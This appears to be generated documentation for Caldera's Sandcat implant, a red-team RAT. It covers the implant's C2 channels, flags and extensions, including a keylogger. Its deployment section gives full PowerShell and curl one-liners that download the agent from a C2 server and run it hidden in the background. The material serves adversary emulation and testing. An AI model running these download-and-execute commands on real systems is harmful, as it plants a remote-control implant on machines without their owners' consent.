---
type: Caldera Plugin
title: Sandcat Plugin
description: Sandcat is Caldera's default Go-based cross-platform RAT (agent/implant) that beacons over HTTP and supports multiple contact protocols.
tags:
  - caldera
  - plugin
  - sandcat
  - agent
  - rat
resource: /plugin/sandcat/gui
generated:
  by: claude-sonnet-4-6
  at: '2026-07-30T16:52:00Z'
status: stable
---

# Sandcat Plugin

Sandcat is Caldera's primary implant — a Go-based RAT compiled on demand by the Caldera server for the target platform. It supports all C2 contact protocols and can be extended with dynamically-loaded modules (called **gocat extensions**).

## Key Capabilities

- Cross-platform: Windows, Linux, macOS (amd64, arm)
- Multiple C2 channels: HTTP, TCP, UDP, WebSocket, DNS, SSH tunnel, FTP
- Dynamic module loading at runtime
- Shell command execution via PowerShell (`psh`), cmd (`cmd`), bash (`sh`), and Python
- File upload/download
- Fact parsing from command output
- Self-cleanup and watchdog timer

## Deployment

The Caldera server compiles Sandcat binaries on the fly via `/file/download`.

### Windows (PowerShell one-liner)
```powershell
$url="http://192.168.8.121:8888/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("file","sandcat.go-windows"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders["Content-Disposition"].Split("=")[1]; [io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data); Start-Process -FilePath "C:\Users\Public\$name.exe" -ArgumentList "-server http://192.168.8.121:8888 -group red" -WindowStyle Hidden
```

### Linux (curl)
```bash
curl -s -X POST -H "file:sandcat.go-linux" -H "platform:linux" \
  http://192.168.8.121:8888/file/download > /tmp/s && \
  chmod +x /tmp/s && nohup /tmp/s -server http://192.168.8.121:8888 -group red &
```

### macOS (curl)
```bash
curl -s -X POST -H "file:sandcat.go-darwin" -H "platform:darwin" \
  http://192.168.8.121:8888/file/download > /tmp/s && \
  chmod +x /tmp/s && /tmp/s -server http://192.168.8.121:8888 -group red &
```

## Sandcat Flags

| Flag | Description | Default |
|---|---|---|
| `-server` | Caldera server URL | required |
| `-group` | Agent group | `red` |
| `-contact` | C2 channel | `http` |
| `-sleep` | Beacon interval (seconds) | `60` |
| `-watchdog` | Self-destruct after N seconds of no contact | `0` (off) |
| `-v` | Verbose output | `false` |
| `-c2` | Alternative C2 address | (uses -server) |

## Gocat Extensions

Sandcat supports runtime-loaded Go modules that extend its capabilities. Extensions are downloaded from the server and loaded into the running process. Examples: keylogger, screenshot, port scanner.
